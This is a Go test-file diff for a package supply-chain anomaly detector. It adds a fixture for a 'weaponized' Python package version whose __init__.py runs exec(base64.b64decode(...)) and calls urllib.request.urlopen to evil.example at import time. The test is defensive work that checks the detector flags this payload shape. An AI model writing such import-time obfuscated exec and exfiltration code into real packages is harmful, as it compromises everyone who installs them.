@@ -7,6 +7,7 @@ import (
 	"os"
 	"path/filepath"
 	"testing"
+	"time"
 
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
@@ -526,6 +527,85 @@ func TestCollector_PyPIEntity_EmitsBothSignals(t *testing.T) {
 	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
 	assert.False(t, anomaly.AnomalyPresent,
 		"AST-blind Python can't spike an AST feature; no anomaly expected")
+}
+
+// TestCollector_PyPIWeaponizedProgression_FiresAnomaly is the
+// Python analog of TestCollector_SyntheticProgression: a clean
+// v1.0.0 that only defines a function, then a v1.1.0 whose
+// __init__.py gains the dominant real PyPI payload shape —
+// exec(base64.b64decode(...)) plus network exfil running at import
+// time. The matrix must show zeros at v1.0.0, a spike at v1.1.0, and
+// the anomaly must fire naming the crossed features. This is the
+// end-to-end proof that the hand-written Python lexer→parser→
+// extractor feeds the existing anomaly detector correctly.
+func TestCollector_PyPIWeaponizedProgression_FiresAnomaly(t *testing.T) {
+	t.Parallel()
+
+	const cleanInit = "VERSION = '1.0.0'\n"
+	const cleanCore = "import json\n\n\ndef parse(s):\n    return json.loads(s)\n"
+
+	const weaponizedInit = "" +
+		"import base64\n" +
+		"import urllib.request\n" +
+		"exec(base64.b64decode('aW1wb3J0IG9z'))\n" +
+		"urllib.request.urlopen('http://evil.example/' + 'exfil')\n" +
+		"VERSION = '1.1.0'\n"
+
+	clonePath, shaByTag := initRepoWithVersionedProgression(t, []versionFixture{
+		{Tag: "1.0.0", Files: map[string]string{
+			"pkg/__init__.py": cleanInit,
+			"pkg/core.py":     cleanCore,
+		}},
+		{Tag: "1.1.0", Files: map[string]string{
+			"pkg/__init__.py": weaponizedInit,
+			"pkg/core.py":     cleanCore,
+		}},
+	})
+
+	pinSource := &fakePinSource{
+		table: PinTable{
+			ModulePath: "demo",
+			Pins: []VersionPin{
+				{Version: "1.0.0", SHA: shaByTag["1.0.0"], Source: "pypi-attestation",
+					PublishedAt: time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)},
+				{Version: "1.1.0", SHA: shaByTag["1.1.0"], Source: "pypi-attestation",
+					PublishedAt: time.Date(2026, 3, 1, 0, 0, 0, 0, time.UTC)},
+			},
+		},
+	}
+
+	c := NewCollector(clonePath, pinSource, false)
+	result, err := c.Collect(t.Context(), pypiEntity("demo"))
+	require.NoError(t, err)
+
+	matrixSig := findEmittedSignal(t, result, "source_evolution_matrix")
+	var matrix MatrixValue
+	require.NoError(t, json.Unmarshal(matrixSig.Value, &matrix))
+	require.Len(t, matrix.Rows, 2)
+
+	byVersion := map[string]MatrixRow{}
+	for _, r := range matrix.Rows {
+		byVersion[r.Version] = r
+	}
+	require.NotNil(t, byVersion["1.0.0"].AST)
+	assert.Equal(t, astfeature.Counts{}, *byVersion["1.0.0"].AST,
+		"clean v1.0.0 must spike nothing")
+	require.NotNil(t, byVersion["1.1.0"].AST)
+	v2 := *byVersion["1.1.0"].AST
+	assert.Positive(t, v2.DynamicEvalCalls, "exec() at import in v1.1.0")
+	assert.Positive(t, v2.Base64DecodeCalls, "base64.b64decode in v1.1.0")
+	assert.Positive(t, v2.NetworkCallSites, "urllib.request.urlopen in v1.1.0")
+	assert.Positive(t, v2.ImportTimeCallSites, "module-scope calls in v1.1.0")
+
+	anomalySig := findEmittedSignal(t, result, "source_evolution_anomaly")
+	var anomaly AnomalyValue
+	require.NoError(t, json.Unmarshal(anomalySig.Value, &anomaly))
+	assert.True(t, anomaly.AnomalyPresent,
+		"a clean→weaponized Python progression must trip the anomaly")
+	assert.Equal(t, "1.1.0", anomaly.FirstAnomalousVersion)
+	assert.Subset(t, anomaly.SpikedFeatures,
+		[]string{"dynamic_eval_calls", "base64_decode_calls", "network_call_sites", "import_time_call_sites"},
+		"the crossed features must be named for the analyst")
 }
 
 // TestCollector_Name_IsSourceEvolution pins the source-tracking
